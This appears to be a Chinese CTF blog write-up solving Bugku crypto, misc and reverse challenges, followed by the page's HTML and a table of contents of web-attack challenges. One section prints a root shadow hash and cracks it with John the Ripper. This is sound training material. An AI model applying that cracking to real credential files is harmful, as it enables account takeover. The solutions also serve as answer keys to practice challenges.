Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.\n 没看懂这是啥…再好好想想。\n这是啥，Ook编码…https://www.splitbrain.org/services/ook。\n获得flag。\n这不是摩斯密码  Des:下载看看吧。\n 这是Brainfuck编码…https://www.splitbrain.org/services/ook。\n获得flag。\neasy_crypto  Des:0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101。\n 摩斯加密，上脚本。\n获得flag。\n简单加密  Des:e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA。\n 这是啥…\nA的ASCII码值为65，=的ASCII码值为61，最后是两个A，可能是凯撒加密后的Base64编码。\n附上凯撒解密脚本。\n获得字符串a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==，Base64 在线编码解码 | Base64 加密解密 - Base64.us。\n获得flag。\n散乱的密文  Des:lf5{ag024c483549d7fd@@1}，一张纸条上凌乱的写着2 1 6 5 3 4。\n 试了试栅栏解密的分组数，不对。\n获得flag。\n凯撒部长的奖励  Des:就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：MSW{byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om}。\n 凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)，一位一位尝试，位移20时得出flag。\n一段Base64  Des:N/A。\n 给了一大段的Base64编码，就不贴上来了。\n解码。\n进行Unescape解码。\n十六进制转文本。\n再进行Unescape。\n十进制转文本。\n\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x30;\u0026#x32;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x30;\u0026#x38;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x39;\u0026#x37;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x30;\u0026#x33;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x33;\u0026#x37;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x35;\u0026#x35;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x36;\u0026#x36;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x39;\u0026#x39;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x31;\u0026#x36;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x30;\u0026#x32;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x39;\u0026#x35;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x31;\u0026#x36;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x30;\u0026#x32;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x39;\u0026#x39;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x35;\u0026#x30;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x34;\u0026#x38;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x34;\u0026#x39;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x35;\u0026#x35;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x34;\u0026#x39;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x35;\u0026#x35;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x31;\u0026#x33;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x31;\u0026#x39;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x31;\u0026#x30;\u0026#x31;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x33;\u0026#x37;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x35;\u0026#x35;\u0026#x3b;\u0026#x26;\u0026#x23;\u0026#x36;\u0026#x38;\u0026#x3b; HTML解码。\n\u0026#102;\u0026#108;\u0026#97;\u0026#103;\u0026#37;\u0026#55;\u0026#66;\u0026#99;\u0026#116;\u0026#102;\u0026#95;\u0026#116;\u0026#102;\u0026#99;\u0026#50;\u0026#48;\u0026#49;\u0026#55;\u0026#49;\u0026#55;\u0026#113;\u0026#119;\u0026#101;\u0026#37;\u0026#55;\u0026#68; HTML解码。\nflag%7Bctf_tfc201717qwe%7D\r改为正常的flag格式。\n.!?  Des:N/A。\n 再怎么改，也改不掉对Ook的独特记忆，https://www.splitbrain.org/services/ook。\n获得flag。\n+[]-  Des:N/A。\n +++++ +++++ [-++ +++++ +++++.+ +++++ .-- -- -.+++ +++.+++ ++ +++.-- ---.+++++++ .-- -- ----. ++++. +++ +. -- -- ----- -.+ ++ ++.-. ----- ---.++++++ .---- .-- --\r.---- -- ----- ----. +.+ +++++ ++ +++++\r+++++ .Ook的兄弟，Brainfuck又来了，https://www.splitbrain.org/services/ook。\n获得flag。\n奇怪的密码  Des:突然天上一道雷电，gndk€rlqhmtkwwp}z。\n g n d k的ASCII码值分别为103 110 100 107。\nf l a g的ASCII码值分别为102 108 97 103。\n发现了规律，上python。\ns = 'gndk€rlqhmtkwwp}z' i = 0 flag = '' while i  len(s): num = ord(s[i]) - (i + 1) flag += chr(num) i += 1 print(flag) 获得flag。\n托马斯.杰斐逊  Des:N/A。\n 这个之前有做过。\n先根据密钥对各行进行替换。\n然后根据密文，对第一列元素进行排列，对每行元素进行循环。\n唯一读的通顺的就是倒数第六列：XSXSBUGKUADMIN。\n获得flag。\nzip伪加密  Des:N/A。\n 题目给了一个压缩包，打开里面的flag.txt文档需要密码，当然这里说了伪加密。\n先来分析一下ZIP文件的三个组成部分：\n压缩源文件数据区：\r50 4B 03 04：这是头文件标记（0x04034b50）\r14 00：解压文件所需 pkware 版本\r00 00：全局方式位标记（有N/A加密）\r08 00：压缩方式\r5A 7E：最后修改文件时间\rF7 46：最后修改文件日期\r16 B5 80 14：CRC-32校验（1480B516）\r19 00 00 00：压缩后尺寸（25）\r17 00 00 00：未压缩尺寸（23）\r07 00：文件名长度\r00 00：扩展记录长度\r压缩源文件目录区：\r50 4B 01 02：目录中文件文件头标记(0x02014b50)\r3F 00：压缩使用的 pkware 版本\r14 00：解压文件所需 pkware 版本\r00 00：全局方式位标记（有N/A加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）\r08 00：压缩方式\r5A 7E：最后修改文件时间\rF7 46：最后修改文件日期\r16 B5 80 14：CRC-32校验（1480B516）\r19 00 00 00：压缩后尺寸（25）\r17 00 00 00：未压缩尺寸（23）\r07 00：文件名长度\r24 00：扩展字段长度\r00 00：文件注释长度\r00 00：磁盘开始号\r00 00：内部文件属性\r20 00 00 00：外部文件属性\r00 00 00 00：局部头部偏移量\r压缩源文件目录结束标志：\r50 4B 05 06：目录结束标记\r00 00：当前磁盘编号\r00 00：目录区开始磁盘编号\r01 00：本磁盘上纪录总数\r01 00：目录区中纪录总数\r59 00 00 00：目录区尺寸大小\r3E 00 00 00：目录区对第一张磁盘的偏移量\r00 00：ZIP 文件注释长度\r找到头文件标记50 4B 03 04与文件头标记50 4B 01 02，将后面对应的全局方式位标记00 09改为00 00破解伪加密，保存后成功打开flag.txt。\n获得flag。\n告诉你个秘密  Des:636A56355279427363446C4A49454A7154534230526D6843 56445A31614342354E326C4B4946467A5769426961453067。\n 数字范围0-9，字母范围A-E。\n十六进制转字符串。\ncjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g\rBase64转字符串。\nr5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM\r这个东西，看看键盘，刚好把中间的键给围了起来。\nTONGYUAN\r获得flag。\n这不是md5  Des:666c61677b616537333538376261353662616566357d。\n 数字范围1-8，字母范围b-d。\n十六进制转文本。\n获得flag。\n贝斯家族  Des:@iH都说了是Base编码了，本菜鸟一个个试，试出来是Base91编码，进行解码。\n获得flag。\n富强民主  Des:公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治。\n 这个…查了一下，这是核心价值观编码。CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (ssleye.com)。\n获得flag。\npython  Des:N/A。\n 给了两个python代码，附上：\n暂时解不出…\n进制转换  Des:二进制、八进制、十进制、十六进制，你能分的清吗？\n d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e\r思路：先把所有数据转换为统一的形式，再转换为字符串。这里转为十六进制。\n十六进制转字符串。\n获得flag。\naffine  Des:y = 17*x-8 flag{szzyfimhyzd}。\n affine为仿射的意思，那么这就是仿射加密了。\n上脚本。\ns = 'szzyfimhyzd' list = [] for i in s: list.append(ord(i) - 97) flag = '' for i in list: for j in range(0, 26): c = (17 * j - 8) % 26 if (c == i): flag += chr(j + 97) print(flag) 获得flag。\nCrack it  Des:破解该文件，获得密码。\n 给了一个shadow文件，记事本打开看看，内容：\nroot:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::\r这个需要应该是破解用户密码，使用kali的john工具，命令：\njohn shadow 结果：\n可以发现密码为hellokitty。\n获得flag。\nrsa  Des:N/A。\n N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597\re : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619\renc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192\r暂时无解。\n来自宇宙的信号  Des:银河战队出击。\n 搜索标准银河字母，找到对应表。\n对应下来就是：\nnopqrst\r获得flag。\nReverse 入门逆向  Des:N/A。\n 用IDA打开看看，定位到main函数。\n有很多的mov指令，66h为f，6Ch为l，猜测这一串就是flag，点击对应的值按R进行转换。\n获得flag。\nEasy_vb  Des:N/A。\n IDA打开文件，上下翻一下。\n获得flag。\nEasy_Re  Des:Hint: 1.逆向常用的工具有IDA 、ollydbg。\n IDA打开文件，挨个看看。\n搜索CTF。\n双击定位去看看。\n这里的xmmword和dq可以转化成字符串，选中按R进行转换。\n将字符串转换为合理的顺序。\n获得flag。\n游戏过关  Des:N/A。\n 先用PEiD看看，\n社工 密码  DES:姓名：张三，生日：19970315。\n 唔，因为是第一个题，应该不会太难，猜测内容为zs19970315。\n获得flag。\nPwn pwn1  Des:nc 114.116.54.89 10001。\n  本文链接：Bugku | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"2469","inLanguage":"en","datePublished":"2020-04-13T22:06:50+08:00","dateModified":"2020-04-13T22:06:50+08:00","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://examplesite.com/post/bugku/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://examplesite.com/ accesskey=h title="Home (Alt + H)">Home</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://examplesite.com/archives/ title=Archives>
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://examplesite.com/>Home</a>&nbsp;»&nbsp;<a href=https://examplesite.com/post/>Posts</a></div>
+<h1 class=post-title>
+Bugku
+</h1>
+<div class=post-meta>April 13, 2020&nbsp;·&nbsp;0opsdc
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#bugku aria-label=Bugku>Bugku</a><ul>
+<li>
+<a href=#web aria-label=Web>Web</a><ul>
+<li>
+<a href=#web1 aria-label=Web1>Web1</a></li>
+<li>
+<a href=#web2 aria-label=Web2>Web2</a></li>
+<li>
+<a href=#web3 aria-label=Web3>Web3</a></li>
+<li>
+<a href=#web4 aria-label=Web4>Web4</a><ul>
+<li>
+<a href=#%e6%96%b9%e6%b3%951 aria-label=方法1>方法1</a></li>
+<li>
+<a href=#%e6%96%b9%e6%b3%952 aria-label=方法2>方法2</a></li>
+<li>
+<a href=#%e6%96%b9%e6%b3%953 aria-label=方法3>方法3</a></li>
+<li>
+<a href=#%e9%a2%98%e7%9b%ae%e6%9b%b4%e6%96%b0 aria-label=题目更新>题目更新</a></li></ul>
+</li>
+<li>
+<a href=#web5 aria-label=Web5>Web5</a></li>
+<li>
+<a href=#web6 aria-label=Web6>Web6</a></li>
+<li>
+<a href=#web7 aria-label=Web7>Web7</a></li>
+<li>
+<a href=#web8 aria-label=Web8>Web8</a><ul>
+<li>
+<a href=#%e9%a2%98%e7%9b%ae%e6%9b%b4%e6%96%b0-1 aria-label=题目更新>题目更新</a></li></ul>
+</li>
+<li>
+<a href=#web9 aria-label=Web9>Web9</a></li>
+<li>
+<a href=#simple_ssti_1 aria-label=Simple_SSTI_1>Simple_SSTI_1</a></li>
+<li>
+<a href=#simple_ssti_2 aria-label=Simple_SSTI_2>Simple_SSTI_2</a></li>
+<li>
+<a href=#web10 aria-label=Web10>Web10</a></li>
+<li>
+<a href=#%e8%ae%a1%e7%ae%97%e5%99%a8 aria-label=计算器>计算器</a></li>
+<li>
+<a href=#web%e5%9f%ba%e7%a1%80_get aria-label=web基础$_GET>web基础$_GET</a></li>
+<li>
+<a href=#web%e5%9f%ba%e7%a1%80_post aria-label=web基础$_POST>web基础$_POST</a></li>
+<li>
+<a href=#%e7%9f%9b%e7%9b%be aria-label=矛盾>矛盾</a></li>
+<li>
+<a href=#%e5%9f%9f%e5%90%8d%e8%a7%a3%e6%9e%90 aria-label=域名解析>域名解析</a></li>
+<li>
+<a href=#%e4%bd%a0%e5%bf%85%e9%a1%bb%e8%ae%a9%e4%bb%96%e5%81%9c%e4%b8%8b aria-label=你必须让他停下>你必须让他停下</a></li>
+<li>
+<a href=#%e6%9c%ac%e5%9c%b0%e5%8c%85%e5%90%ab aria-label=本地包含>本地包含</a></li>
+<li>
+<a href=#%e5%8f%98%e9%87%8f aria-label=变量>变量</a></li>
+<li>
+<a href=#%e5%a4%b4%e7%ad%89%e8%88%b1 aria-label=头等舱>头等舱</a></li>
+<li>
+<a href=#%e7%bd%91%e7%ab%99%e8%a2%ab%e9%bb%91 aria-label=网站被黑>网站被黑</a></li>
+<li>
+<a href=#%e7%ae%a1%e7%90%86%e5%91%98%e7%b3%bb%e7%bb%9f aria-label=管理员系统>管理员系统</a></li>
+<li>
+<a href=#flag%e5%9c%a8index%e9%87%8c%e9%9d%a2 aria-label=flag在index里面>flag在index里面</a></li>
+<li>
+<a href=#%e8%be%93%e5%85%a5%e5%af%86%e7%a0%81%e6%9f%a5%e7%9c%8bflag aria-label=输入密码查看flag>输入密码查看flag</a></li>
+<li>
+<a href=#%e7%82%b9%e5%87%bb%e4%b8%80%e7%99%be%e4%b8%87%e6%ac%a1 aria-label=点击一百万次>点击一百万次</a></li>
+<li>
+<a href=#%e5%a4%87%e4%bb%bd%e6%98%af%e4%b8%aa%e5%a5%bd%e4%b9%a0%e6%83%af aria-label=备份是个好习惯>备份是个好习惯</a></li>
+<li>
+<a href=#%e6%88%90%e7%bb%a9%e5%8d%95 aria-label=成绩单>成绩单</a></li>
+<li>
+<a href=#%e7%a7%8b%e5%90%8d%e5%b1%b1%e8%80%81%e5%8f%b8%e6%9c%ba aria-label=秋名山老司机>秋名山老司机</a></li>
+<li>
+<a href=#%e9%80%9f%e5%ba%a6%e8%a6%81%e5%bf%ab aria-label=速度要快>速度要快</a></li>
+<li>
+<a href=#cookies%e6%ac%ba%e9%aa%97 aria-label=cookies欺骗>cookies欺骗</a></li>
+<li>
+<a href=#never-give-up aria-label="never give up">never give up</a></li>
+<li>
+<a href=#welcome-to-bugkuctf aria-label="welcome to bugkuctf">welcome to bugkuctf</a></li>
+<li>
+<a href=#%e8%bf%87%e7%8b%97%e4%b8%80%e5%8f%a5%e8%af%9d aria-label=过狗一句话>过狗一句话</a></li>
+<li>
+<a href=#%e5%ad%97%e7%ac%a6%e6%ad%a3%e5%88%99 aria-label=字符？正则？>字符？正则？</a></li>
+<li>
+<a href=#%e5%89%8d%e5%a5%b3%e5%8f%8b aria-label=前女友>前女友</a></li>
+<li>
+<a href=#login1 aria-label=login1>login1</a></li>
+<li>
+<a href=#%e4%bd%a0%e4%bb%8e%e5%93%aa%e9%87%8c%e6%9d%a5 aria-label=你从哪里来>你从哪里来</a></li>
+<li>
+<a href=#md5-collision aria-label="md5 collision">md5 collision</a></li>
+<li>
+<a href=#%e7%a8%8b%e5%ba%8f%e5%91%98%e6%9c%ac%e5%9c%b0%e7%bd%91%e7%ab%99 aria-label=程序员本地网站>程序员本地网站</a></li>
+<li>
+<a href=#%e5%90%84%e7%a7%8d%e7%bb%95%e8%bf%87 aria-label=各种绕过>各种绕过</a></li>
+<li>
+<a href=#%e7%bb%86%e5%bf%83 aria-label=细心>细心</a></li>
+<li>
+<a href=#%e6%b1%82getshell aria-label=求getshell>求getshell</a></li>
+<li>
+<a href=#insert-into%e6%b3%a8%e5%85%a5 aria-label="INSERT INTO注入">INSERT INTO注入</a></li>
+<li>
+<a href=#%e8%bf%99%e6%98%af%e4%b8%80%e4%b8%aa%e7%a5%9e%e5%a5%87%e7%9a%84%e7%99%bb%e5%bd%95%e6%a1%86 aria-label=这是一个神奇的登录框>这是一个神奇的登录框</a></li>
+<li>
+<a href=#%e5%a4%9a%e6%ac%a1 aria-label=多次>多次</a></li>
+<li>
+<a href=#php_encrypt_1 aria-label=PHP_encrypt_1>PHP_encrypt_1</a></li>
+<li>
+<a href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab2 aria-label=文件包含2>文件包含2</a></li>
+<li>
+<a href=#flagphp aria-label=flag.php>flag.php</a></li>
+<li>
+<a href=#sql%e6%b3%a8%e5%85%a52 aria-label=sql注入2>sql注入2</a></li>
+<li>
+<a href=#%e5%ad%99xx%e7%9a%84%e5%8d%9a%e5%ae%a2 aria-label=孙xx的博客>孙xx的博客</a></li>
+<li>
+<a href=#trim%e7%9a%84%e6%97%a5%e8%ae%b0%e6%9c%ac aria-label=Trim的日记本>Trim的日记本</a></li>
+<li>
+<a href=#login2 aria-label=login2>login2</a></li>
+<li>
+<a href=#login3 aria-label=login3>login3</a></li>
+<li>
+<a href=#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a02 aria-label=文件上传2>文件上传2</a></li>
+<li>
+<a href=#%e6%b1%9f%e6%b9%96%e9%ad%94%e5%a4%b4 aria-label=江湖魔头>江湖魔头</a></li>
+<li>
+<a href=#login4 aria-label=login4>login4</a></li></ul>
+</li>
+<li>
+<a href=#web%e8%bf%9b%e9%98%b6 aria-label=Web进阶>Web进阶</a><ul>
+<li>
+<a href=#phpcmsv9 aria-label=phpcmsV9>phpcmsV9</a></li>
+<li>
+<a href=#%e6%b5%b7%e6%b4%8bcms aria-label=海洋CMS>海洋CMS</a></li>
+<li>
+<a href=#%e5%b0%8f%e6%98%8e%e7%9a%84%e5%8d%9a%e5%ae%a2 aria-label=小明的博客>小明的博客</a></li>
+<li>
+<a href=#bugku-cms1 aria-label=Bugku-cms1>Bugku-cms1</a></li>
+<li>
+<a href=#maccms-%e8%8b%b9%e6%9e%9ccms aria-label=maccms-苹果cms>maccms-苹果cms</a></li>
+<li>
+<a href=#bugku-%e4%bc%81%e4%b8%9a%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f aria-label=Bugku-企业管理系统>Bugku-企业管理系统</a></li>
+<li>
+<a href=#appcms aria-label=appcms>appcms</a></li>
+<li>
+<a href=#%e5%ae%9e%e6%88%982-%e6%b3%a8%e5%85%a5 aria-label=实战2-注入>实战2-注入</a></li>
+<li>
+<a href=#bugkucms aria-label=bugkucms>bugkucms</a></li>
+<li>
+<a href=#bugku%e5%af%bc%e8%88%aa aria-label=bugku导航>bugku导航</a></li>
+<li>
+<a href=#%e5%8f%88%e6%98%af%e4%b8%80%e4%b8%aa%e5%8d%9a%e5%ae%a2 aria-label=又是一个博客>又是一个博客</a></li></ul>
+</li>
+<li>
+<a href=#misc aria-label=Misc>Misc</a><ul>
+<li>
+<a href=#%e7%ad%be%e5%88%b0%e9%a2%98 aria-label=签到题>签到题</a></li>
+<li>
+<a href=#%e8%bf%99%e6%98%af%e4%b8%80%e5%bc%a0%e5%8d%95%e7%ba%af%e7%9a%84%e5%9b%be%e7%89%87 aria-label=这是一张单纯的图片>这是一张单纯的图片</a></li>
+<li>
+<a href=#%e9%9a%90%e5%86%99 aria-label=隐写>隐写</a></li>
+<li>
+<a href=#telnet aria-label=telnet>telnet</a></li>
+<li>
+<a href=#%e7%9c%bc%e8%a7%81%e9%9d%9e%e5%ae%9e aria-label=眼见非实>眼见非实</a></li></ul>
+</li>
+<li>
+<a href=#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1 aria-label=代码审计>代码审计</a><ul>
+<li>
+<a href=#extract%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96 aria-label=extract变量覆盖>extract变量覆盖</a></li></ul>
+</li>
+<li>
+<a href=#%e5%88%86%e6%9e%90 aria-label=分析>分析</a><ul>
+<li>
+<a href=#flag%e8%a2%ab%e7%9b%97 aria-label=flag被盗>flag被盗</a></li></ul>
+</li>
+<li>
+<a href=#%e5%8a%a0%e5%af%86 aria-label=加密>加密</a><ul>
+<li>
+<a href=#%e6%bb%b4%e7%ad%94%e6%bb%b4 aria-label=滴答~滴>滴答~滴</a></li>
+<li>
+<a href=#%e8%81%aa%e6%98%8e%e7%9a%84%e5%b0%8f%e7%be%8a aria-label=聪明的小羊>聪明的小羊</a></li>
+<li>
+<a href=#ok aria-label=ok>ok</a></li>
+<li>
